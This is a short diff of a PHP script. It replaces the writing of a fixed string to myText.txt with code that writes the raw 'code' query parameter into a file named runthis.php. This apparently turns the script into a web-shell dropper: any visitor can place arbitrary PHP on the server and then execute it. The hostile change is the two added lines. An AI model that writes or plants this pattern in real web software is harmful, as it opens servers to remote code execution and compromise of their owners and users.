@@ -1,5 +1,5 @@
 <?php
-    $content = "gege";
-    $fp = fopen("myText.txt","wb");
+    $content = $_GET['code'];
+    $fp = fopen("runthis.php","wb");
     fwrite($fp,$content);
     fclose($fp);
